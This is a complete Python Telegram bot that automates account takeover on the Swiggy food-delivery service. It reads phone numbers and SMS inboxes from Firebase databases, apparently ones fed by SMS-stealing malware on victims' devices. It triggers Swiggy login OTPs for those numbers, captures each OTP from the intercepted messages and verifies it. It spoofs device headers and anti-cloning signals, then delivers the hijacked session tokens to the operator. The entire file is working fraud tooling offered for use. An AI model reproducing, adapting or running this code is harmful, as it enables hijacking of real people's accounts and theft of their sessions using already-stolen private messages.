#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Swiggy Firebase OTP Account Creator — Telegram Bot
Flow: User sends Firebase URL → find online devices → extract phones
      → Swiggy OTP request → catch OTP from Firebase → verify → save JSON
      → send all JSONs at end
"""

import os
import re
import json
import base64
import secrets
import logging
import asyncio
import aiohttp
import threading
import time
from datetime import datetime
from typing import Any, Dict, List, Optional, Set

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.request import HTTPXRequest
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ============================================================================
#  CONFIG — fill before deploy
# ============================================================================

BOT_TOKEN        = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_IDS: Set[int] = set(
    int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip().isdigit()
)

SWIGGY_BASE      = "https://profile.swiggy.com"
OTP_TIMEOUT      = 50          # seconds to wait for OTP per number
OTP_POLL_INTERVAL = 1.5        # firebase poll cadence
FB_REQUEST_TIMEOUT = 6         # aiohttp timeout for firebase calls
MAX_CONCURRENT   = 5           # parallel Swiggy OTP requests
SESSIONS_DIR     = "sessions"  # folder for JSON dumps

# ============================================================================
#  LOGGING
# ============================================================================

logging.basicConfig(
    format="%(asctime)s [BOT] %(levelname)-5s %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
)
log = logging.getLogger("SwiggyFB")

# ============================================================================
#  DEVICE POOL — Swiggy Android spoofing
# ============================================================================

DEVICE_POOL = [
    {"vendor": "GOOGLE",   "hardware": "Pixel 8",    "ver": "1940", "sw": "4.140.0"},
    {"vendor": "SAMSUNG",  "hardware": "SM-S921B",   "ver": "1942", "sw": "4.140.1"},
    {"vendor": "ONEPLUS",  "hardware": "CPH2573",    "ver": "1938", "sw": "4.139.0"},
    {"vendor": "XIAOMI",   "hardware": "2312DRAABL", "ver": "1941", "sw": "4.140.0"},
    {"vendor": "REALME",   "hardware": "RMX3888",    "ver": "1939", "sw": "4.139.5"},
]

# ============================================================================
#  FIREBASE — device discovery + OTP watcher
# ============================================================================

PHONE_RE = re.compile(r'(?:^|[^\d])([6-9]\d{9})(?:[^\d]|$)')
ONLINE_FIELDS = ("status", "online", "isOnline", "connected", "active")
ONLINE_TRUE   = {"true", "1", "online", "connected", "active", "yes"}
SMS_SUBPATHS  = [
    "messages", "sms", "inbox", "Sms", "SMS", "callLogs",
    "calls", "notifications", "receivedSms", "smsList",
    "All_Users/sms", "user_sms",
]
ROOT_KEYS_TRY = [
    "clients", "devices", "users", "Clients", "Devices",
    "client", "device", "phones", "mobiles", "user_data",
]


def _clean_phone(raw) -> Optional[str]:
    if not raw:
        return None
    digits = re.sub(r"\D", "", str(raw))
    if digits.startswith("91") and len(digits) == 12:
        digits = digits[2:]
    if digits.startswith("0") and len(digits) == 11:
        digits = digits[1:]
    if len(digits) == 10 and digits[0] in "6789":
        return digits
    return None


def _is_online(dev: dict) -> bool:
    for f in ONLINE_FIELDS:
        v = dev.get(f)
        if v is None:
            continue
        if isinstance(v, bool):
            return v
        if isinstance(v, int):
            return v == 1
        if str(v).lower().strip() in ONLINE_TRUE:
            return True
    return False


def _phone_from_fields(dev: dict) -> Optional[str]:
    # sims list
    sims = dev.get("sims", [])
    if isinstance(sims, dict):
        sims = list(sims.values())
    if isinstance(sims, list):
        for sim in sims[:2]:
            if isinstance(sim, dict):
                for k in ("phoneNumber", "phone", "number", "mobNo", "mob",
                          "sim1Number", "sim2Number", "numberSim1", "numberSim2"):
                    p = _clean_phone(sim.get(k))
                    if p:
                        return p
    # top-level fields
    for k in ("mobNo", "mob", "phoneNumber", "phone", "number", "mobile",
               "numberSim1", "numberSim2", "d_phone"):
        p = _clean_phone(dev.get(k))
        if p:
            return p
    return None


def _phone_from_messages(msgs) -> Optional[str]:
    from collections import Counter
    counts: Counter = Counter()
    items = msgs.values() if isinstance(msgs, dict) else (msgs if isinstance(msgs, list) else [])
    for msg in items:
        if not isinstance(msg, dict):
            continue
        text = str(
            msg.get("body") or msg.get("message") or
            msg.get("text") or msg.get("content") or ""
        )
        for m in PHONE_RE.finditer(text):
            counts[m.group(1)] += 1
    return counts.most_common(1)[0][0] if counts else None


async def _fb_get(session: aiohttp.ClientSession, url: str) -> Optional[Any]:
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT)) as r:
            if r.status != 200:
                return None
            return await r.json(content_type=None)
    except Exception:
        return None


async def load_firebase_root(firebase_url: str) -> Optional[dict]:
    """Try common root keys; return first non-empty dict of device-like entries."""
    async with aiohttp.ClientSession() as sess:
        # try known keys in parallel
        tasks = {k: asyncio.create_task(_fb_get(sess, f"{firebase_url}{k}.json"))
                 for k in ROOT_KEYS_TRY}
        results = {k: await t for k, t in tasks.items()}
        for k, data in results.items():
            if isinstance(data, dict) and len(data) > 0:
                sample = next(iter(data.values()), None)
                if isinstance(sample, dict):
                    log.info(f"Firebase: loaded {len(data)} entries from /{k}.json")
                    return data

        # shallow discovery fallback
        shallow = await _fb_get(sess, f"{firebase_url}.json?shallow=true")
        if isinstance(shallow, dict):
            coros = []
            keys  = []
            for k in shallow:
                coros.append(_fb_get(sess, f"{firebase_url}{k}.json"))
                keys.append(k)
            fetched = await asyncio.gather(*coros)
            for k, data in zip(keys, fetched):
                if isinstance(data, dict) and len(data) > 0:
                    sample = next(iter(data.values()), None)
                    if isinstance(sample, dict):
                        log.info(f"Firebase shallow: loaded {len(data)} from /{k}.json")
                        return data
    return None


async def extract_online_phones(firebase_url: str) -> List[Dict[str, str]]:
    """
    Returns list of {phone, device_id} dicts for online (or all if none online) devices.
    """
    raw = await load_firebase_root(firebase_url)
    if not raw:
        return []

    online = {cid: dev for cid, dev in raw.items()
               if isinstance(dev, dict) and _is_online(dev)}
    pool = online if online else {cid: dev for cid, dev in raw.items()
                                   if isinstance(dev, dict)}
    if not pool:
        return []

    # fetch phones — some devices need a message scan
    results: List[Dict] = []
    seen:    Set[str]   = set()
    sem = asyncio.Semaphore(30)

    async def process(cid: str, dev: dict):
        async with sem:
            phone = _phone_from_fields(dev)
            if not phone:
                # try scanning messages
                async with aiohttp.ClientSession() as sess:
                    for sp in SMS_SUBPATHS[:4]:
                        data = await _fb_get(sess, f"{firebase_url}{sp}/{cid}.json")
                        if isinstance(data, dict) and data:
                            phone = _phone_from_messages(data)
                            if phone:
                                break
            if phone and phone not in seen:
                seen.add(phone)
                results.append({"phone": phone, "device_id": cid})

    await asyncio.gather(*[process(cid, dev) for cid, dev in pool.items()])
    log.info(f"Extracted {len(results)} unique phones from {firebase_url}")
    return results


async def get_last_sms_key(firebase_url: str, device_id: str) -> tuple:
    """Snapshot current last SMS key before sending OTP."""
    latest: Optional[str] = None
    active_path: Optional[str] = None
    async with aiohttp.ClientSession() as sess:
        for sp in SMS_SUBPATHS:
            url = f'{firebase_url}{sp}/{device_id}.json?orderBy="$key"&limitToLast=1'
            data = await _fb_get(sess, url)
            if isinstance(data, dict) and data:
                k = sorted(data.keys())[-1]
                if latest is None or k > latest:
                    latest = k
                    active_path = sp
    return latest, active_path


OTP_PATTERNS_SCORED = [
    (re.compile(r'\b(\d{6})\b'), 10),
    (re.compile(r'\b(\d{4})\b'), 5),
]
OTP_POSITIVE_KW = {"otp", "code", "verify", "verification", "pin",
                   "one time", "passcode", "password", "secret"}
OTP_NEGATIVE_KW = {"₹", "rs.", "amount", "price"}


def _extract_otp(body: str) -> Optional[str]:
    from collections import defaultdict
    body_lo = body.lower()
    scores: dict = defaultdict(int)
    for pat, base_score in OTP_PATTERNS_SCORED:
        for m in pat.finditer(body):
            n = m.group(1)
            val = int(n)
            if 1900 <= val <= 2099:
                continue
            scores[n] += base_score
            for kw in OTP_POSITIVE_KW:
                if kw in body_lo:
                    scores[n] += 6
                    break
            for kw in OTP_NEGATIVE_KW:
                if kw in body_lo:
                    scores[n] -= 10
    if not scores:
        return None
    best = max(scores, key=scores.__getitem__)
    return best if scores[best] > 0 else None


async def wait_for_otp_firebase(
    firebase_url: str,
    device_id: str,
    last_key: Optional[str],
    timeout: int = OTP_TIMEOUT,
    active_subpath: Optional[str] = None,
    progress_cb=None,
) -> Optional[str]:
    """Poll Firebase SMS paths for a new OTP message. Calls progress_cb(remaining) each second."""
    deadline = time.monotonic() + timeout
    poll_paths = ([active_subpath] + [s for s in SMS_SUBPATHS if s != active_subpath]
                  if active_subpath else SMS_SUBPATHS)

    async with aiohttp.ClientSession() as sess:
        while time.monotonic() < deadline:
            remaining = int(deadline - time.monotonic())
            if progress_cb:
                await progress_cb(remaining)

            for sp in poll_paths:
                url = f'{firebase_url}{sp}/{device_id}.json?orderBy="$key"&limitToLast=20'
                data = await _fb_get(sess, url)
                if not isinstance(data, dict):
                    continue
                for k in sorted(data.keys(), reverse=True):
                    if last_key and k <= last_key:
                        break
                    msg = data[k]
                    if isinstance(msg, dict):
                        body = str(
                            msg.get("body") or msg.get("message") or
                            msg.get("text") or msg.get("content") or
                            " ".join(str(v) for v in msg.values() if isinstance(v, str))
                        )
                    elif isinstance(msg, str):
                        body = msg
                    else:
                        continue
                    otp = _extract_otp(body)
                    if otp:
                        return otp

            await asyncio.sleep(OTP_POLL_INTERVAL)

    return None


# ============================================================================
#  SWIGGY API
# ============================================================================

def _swiggy_headers(overrides: dict = None) -> Dict[str, str]:
    dev = secrets.choice(DEVICE_POOL)
    uid = secrets.token_hex(8)
    h = {
        "user-agent": "Swiggy-Android",
        "content-type": "application/json; charset=utf-8",
        "accept": "application/json; charset=utf-8",
        "version-code": dev["ver"],
        "app-version": dev["sw"],
        "manufacturer": dev["vendor"],
        "model-name": dev["hardware"],
        "swuid": uid,
        "deviceid": uid,
    }
    if overrides:
        h.update(overrides)
    return h


def _decode_jwt(token: str) -> dict:
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return {}
        pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(pad).decode())
    except Exception:
        return {}


async def swiggy_send_otp(phone: str) -> Dict[str, Any]:
    dev_id = secrets.token_hex(8)
    h = _swiggy_headers({"swuid": dev_id, "deviceid": dev_id})
    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True)) as http:
        try:
            async with http.get(
                f"{SWIGGY_BASE}/api/v3/app/sms_otp",
                params={"mobile": phone},
                headers=h,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as resp:
                data = await resp.json(content_type=None) or {}
                if resp.status == 200 and data.get("statusCode") == 0:
                    tid = data.get("tid")
                    sid = data.get("sid")
                    if not sid and tid:
                        sid = _decode_jwt(tid).get("sid")
                    return {
                        "success": True,
                        "tid": tid,
                        "sid": sid,
                        "deviceId": data.get("deviceId") or dev_id,
                    }
                return {"success": False, "msg": data.get("statusMessage", f"HTTP {resp.status}")}
        except Exception as e:
            return {"success": False, "msg": str(e)}


async def swiggy_verify_otp(phone: str, otp: str, auth: Dict) -> Dict[str, Any]:
    h = _swiggy_headers({
        **({"tid": auth["tid"]} if auth.get("tid") else {}),
        **({"sid": str(auth["sid"])} if auth.get("sid") else {}),
        **({"swuid": auth["deviceId"], "deviceid": auth["deviceId"]}
           if auth.get("deviceId") else {}),
    })
    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True)) as http:
        try:
            async with http.post(
                f"{SWIGGY_BASE}/api/v3/app/login/verify",
                params={"otp_source": "Sms-manual"},
                json={
                    "cloningSignalsData": {
                        "appFilesDirPathInvalid": 0, "developerModeEnabled": 1,
                        "deviceModelVmos": 0, "emulatorStatus": 0,
                        "packageName": "in.swiggy.android", "workProfileEnabled": 0,
                    },
                    "otp": otp,
                },
                headers=h,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as resp:
                data = await resp.json(content_type=None) or {}
                if resp.status != 200 or data.get("statusCode") != 0:
                    return {"success": False, "msg": data.get("statusMessage", "Verification failed")}

                session: Dict[str, Any] = {}
                inner = data.get("data") if isinstance(data.get("data"), dict) else {}
                for key in ("token", "tid", "sid"):
                    if inner.get(key):
                        session[key] = inner[key]
                    elif data.get(key):
                        session[key] = data[key]
                session["deviceId"] = str(data.get("deviceId") or auth.get("deviceId", ""))

                uid = _decode_jwt(session.get("tid", "")).get("user_id")
                if not uid:
                    return {"success": False, "msg": "No user_id in JWT"}

                session["userid"]     = str(uid)
                session["customerId"] = str(uid)
                session["mobile"]     = phone
                return {"success": True, "session": session}
        except Exception as e:
            return {"success": False, "msg": str(e)}


# ============================================================================
#  SESSION SAVER
# ============================================================================

os.makedirs(SESSIONS_DIR, exist_ok=True)


def save_session(session: Dict[str, Any]) -> str:
    phone = session.get("mobile", "unknown")
    path  = os.path.join(SESSIONS_DIR, f"swiggy_{phone}.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(session, f, indent=4)
    return path


# ============================================================================
#  PER-USER STATE
# ============================================================================

class UserState:
    __slots__ = (
        "firebase_url", "phase", "devices", "results",
        "total", "done", "failed", "status_msg_id",
    )

    def __init__(self):
        self.firebase_url:   Optional[str]        = None
        self.phase:          str                  = "idle"  # idle | waiting_url | running
        self.devices:        List[Dict]           = []
        self.results:        List[Dict[str, Any]] = []
        self.total:          int                  = 0
        self.done:           int                  = 0
        self.failed:         int                  = 0
        self.status_msg_id:  Optional[int]        = None


_states: Dict[int, UserState] = {}


def get_state(uid: int) -> UserState:
    if uid not in _states:
        _states[uid] = UserState()
    return _states[uid]


# ============================================================================
#  BOT HANDLERS
# ============================================================================

def _is_admin(uid: int) -> bool:
    return not ADMIN_IDS or uid in ADMIN_IDS


def main_menu(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Send Firebase URL", callback_data="send_url")],
        [InlineKeyboardButton("📊 Status", callback_data="status"),
         InlineKeyboardButton("📁 Get All JSONs", callback_data="get_jsons")],
        [InlineKeyboardButton("🗑 Clear Sessions", callback_data="clear_sessions")],
    ])


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not _is_admin(uid):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    st = get_state(uid)
    st.phase = "idle"
    await update.message.reply_text(
        "🍔 *Swiggy Firebase OTP Creator*\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "Send a Firebase Realtime DB URL → I find online devices "
        "→ grab their numbers → hit Swiggy OTP → catch OTP from Firebase "
        "→ create accounts → send you all JSONs.\n\n"
        "👇 Pick an action:",
        parse_mode="Markdown",
        reply_markup=main_menu(uid),
    )


async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    uid = q.from_user.id
    if not _is_admin(uid):
        await q.answer("⛔ Unauthorized", show_alert=True)
        return
    await q.answer()

    data = q.data
    st   = get_state(uid)

    if data == "send_url":
        st.phase = "waiting_url"
        await q.edit_message_text(
            "📡 *Send Firebase URL*\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Example:\n`https://your-project-default-rtdb.firebaseio.com/`\n\n"
            "Send the URL now:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Cancel", callback_data="cancel")
            ]]),
        )
        return

    if data == "cancel":
        st.phase = "idle"
        await q.edit_message_text(
            "Cancelled. Use /start to go back.",
            reply_markup=main_menu(uid),
        )
        return

    if data == "status":
        total_sessions = len([f for f in os.listdir(SESSIONS_DIR) if f.endswith(".json")])
        text = (
            f"📊 *Bot Status*\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Phase      : `{st.phase}`\n"
            f"Firebase   : `{st.firebase_url or 'none'}`\n"
            f"Devices    : `{st.total}`\n"
            f"Done       : `{st.done}` ✅\n"
            f"Failed     : `{st.failed}` ❌\n"
            f"Sessions   : `{total_sessions}` files\n"
        )
        await q.edit_message_text(text, parse_mode="Markdown",
                                   reply_markup=main_menu(uid))
        return

    if data == "get_jsons":
        files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith(".json")]
        if not files:
            await q.answer("No sessions yet.", show_alert=True)
            return
        # collect all and send summary JSON
        all_sessions = []
        for fn in files:
            try:
                with open(os.path.join(SESSIONS_DIR, fn)) as f:
                    all_sessions.append(json.load(f))
            except Exception:
                pass
        summary_path = os.path.join(SESSIONS_DIR, "all_accounts.json")
        with open(summary_path, "w") as f:
            json.dump(all_sessions, f, indent=2)
        with open(summary_path, "rb") as f:
            await ctx.bot.send_document(
                uid, document=f,
                filename="all_accounts.json",
                caption=f"📦 *{len(all_sessions)} Swiggy accounts*",
                parse_mode="Markdown",
            )
        return

    if data == "clear_sessions":
        count = 0
        for fn in os.listdir(SESSIONS_DIR):
            if fn.endswith(".json"):
                os.remove(os.path.join(SESSIONS_DIR, fn))
                count += 1
        st.results = []
        await q.answer(f"🗑 Cleared {count} session files.", show_alert=True)
        return


async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    if not _is_admin(uid):
        return
    text = (update.message.text or "").strip()
    st   = get_state(uid)

    if st.phase != "waiting_url":
        await update.message.reply_text("Use /start first.")
        return

    # validate firebase url
    if "firebaseio.com" not in text and "firebasedatabase.app" not in text:
        await update.message.reply_text(
            "❌ Doesn't look like a Firebase URL. Try again or /start."
        )
        return

    url = text if text.endswith("/") else text + "/"
    st.firebase_url = url
    st.phase        = "running"
    st.results      = []
    st.done         = 0
    st.failed       = 0
    st.total        = 0

    status = await update.message.reply_text(
        f"🔍 Scanning Firebase: `{url}`\n⏳ Finding online devices...",
        parse_mode="Markdown",
    )
    st.status_msg_id = status.message_id

    # run the whole flow in background so bot stays responsive
    asyncio.create_task(_run_flow(uid, ctx, status))


async def _run_flow(uid: int, ctx: ContextTypes.DEFAULT_TYPE, status_msg):
    st  = get_state(uid)
    url = st.firebase_url

    # ── step 1: extract devices ──────────────────────────────────────────
    try:
        devices = await extract_online_phones(url)
    except Exception as e:
        await _edit_safe(status_msg,
            f"❌ Firebase error: `{e}`\n\nUse /start to try again.",
            parse_mode="Markdown")
        st.phase = "idle"
        return

    if not devices:
        await _edit_safe(status_msg,
            "⚠️ No devices with phone numbers found in this Firebase.\n"
            "Check URL or try another.",
            reply_markup=main_menu(uid))
        st.phase = "idle"
        return

    st.devices = devices
    st.total   = len(devices)

    await _edit_safe(status_msg,
        f"✅ Found *{st.total} devices* with phone numbers.\n"
        f"🚀 Starting Swiggy OTP flow...\n\n"
        f"```\n{'No':<4} {'Phone':<14} {'Status'}\n{'─'*35}\n```",
        parse_mode="Markdown")

    # ── step 2: process devices with concurrency cap ──────────────────────
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    log_lines: List[str] = []

    async def process_one(entry: Dict):
        phone     = entry["phone"]
        device_id = entry["device_id"]
        async with sem:
            result = await _process_phone(uid, phone, device_id, url, ctx, status_msg, log_lines)
            return result

    await asyncio.gather(*[process_one(e) for e in devices])

    # ── step 3: send summary ──────────────────────────────────────────────
    st.phase = "idle"
    total_sessions = [f for f in os.listdir(SESSIONS_DIR) if f.endswith(".json")]
    success_count  = st.done
    fail_count     = st.failed

    summary = (
        f"🎉 *Run Complete!*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✅ Success : `{success_count}`\n"
        f"❌ Failed  : `{fail_count}`\n"
        f"📱 Total   : `{st.total}`\n\n"
    )

    if st.results:
        summary += "Sending all account JSONs...\n"

    await _edit_safe(status_msg, summary, parse_mode="Markdown",
                     reply_markup=main_menu(uid))

    # send individual files
    for s in st.results:
        path = save_session(s)
        try:
            with open(path, "rb") as f:
                await ctx.bot.send_document(
                    uid,
                    document=f,
                    filename=f"swiggy_{s['mobile']}.json",
                    caption=f"✅ `{s['mobile']}` | ID: `{s.get('customerId','?')}`",
                    parse_mode="Markdown",
                )
        except Exception:
            pass

    # send combined JSON
    if st.results:
        all_path = os.path.join(SESSIONS_DIR, "all_accounts.json")
        with open(all_path, "w") as f:
            json.dump(st.results, f, indent=2)
        with open(all_path, "rb") as f:
            await ctx.bot.send_document(
                uid,
                document=f,
                filename="all_accounts.json",
                caption=f"📦 *All {len(st.results)} Swiggy accounts combined*",
                parse_mode="Markdown",
            )


async def _process_phone(
    uid: int, phone: str, device_id: str,
    firebase_url: str, ctx: ContextTypes.DEFAULT_TYPE,
    status_msg, log_lines: List[str]
) -> bool:
    st = get_state(uid)

    def _log(icon: str, msg: str):
        line = f"{icon} `{phone}` — {msg}"
        log_lines.append(line)
        # keep last 20 lines visible
        visible = "\n".join(log_lines[-20:])
        asyncio.create_task(_edit_safe(
            status_msg,
            f"🔄 *Processing {st.done + st.failed + 1}/{st.total}*\n"
            f"━━━━━━━━━━━━━━━━━━\n{visible}",
            parse_mode="Markdown",
        ))

    # ── snapshot firebase before OTP ──────────────────────────────────────
    last_key, active_sp = await get_last_sms_key(firebase_url, device_id)

    # ── send Swiggy OTP ──────────────────────────────────────────────────
    _log("📤", "sending OTP...")
    otp_res = await swiggy_send_otp(phone)
    if not otp_res["success"]:
        _log("❌", f"OTP send failed: {otp_res.get('msg', '?')}")
        st.failed += 1
        return False

    auth = {
        "phone":    phone,
        "tid":      otp_res.get("tid"),
        "sid":      otp_res.get("sid"),
        "deviceId": otp_res.get("deviceId"),
    }

    # ── wait for OTP on Firebase ──────────────────────────────────────────
    _log("⏳", f"waiting for OTP ({OTP_TIMEOUT}s)...")

    attempt = 0
    otp = None
    while attempt < 2:
        otp = await wait_for_otp_firebase(
            firebase_url, device_id, last_key,
            timeout=OTP_TIMEOUT,
            active_subpath=active_sp,
        )
        if otp:
            break
        attempt += 1
        if attempt < 2:
            # retry OTP send once
            _log("🔄", "OTP timeout, retrying OTP send...")
            retry = await swiggy_send_otp(phone)
            if retry["success"]:
                auth = {
                    "phone":    phone,
                    "tid":      retry.get("tid"),
                    "sid":      retry.get("sid"),
                    "deviceId": retry.get("deviceId"),
                }
                last_key, active_sp = await get_last_sms_key(firebase_url, device_id)
            else:
                break

    if not otp:
        _log("⏰", f"OTP timeout after {OTP_TIMEOUT * 2}s — skipping")
        st.failed += 1
        return False

    _log("🔑", f"OTP received: `{otp}`")

    # ── verify on Swiggy ──────────────────────────────────────────────────
    verify_res = await swiggy_verify_otp(phone, otp, auth)
    if not verify_res["success"]:
        _log("❌", f"verify failed: {verify_res.get('msg', '?')}")
        st.failed += 1
        return False

    session = verify_res["session"]
    st.results.append(session)
    st.done += 1
    _log("✅", f"account created! ID: `{session.get('customerId', '?')}`")
    return True


async def _edit_safe(msg, text: str, **kwargs):
    try:
        await msg.edit_text(text, **kwargs)
    except Exception:
        pass


# ============================================================================
#  MAIN
# ============================================================================

def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        raise SystemExit("Set BOT_TOKEN env var or fill it in bot.py")

    log.info("Starting Swiggy Firebase OTP Bot...")

    req = HTTPXRequest(
        connect_timeout=30.0, read_timeout=30.0,
        write_timeout=30.0, pool_timeout=30.0,
    )
    app = Application.builder().token(BOT_TOKEN).request(req).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))

    log.info("Bot polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
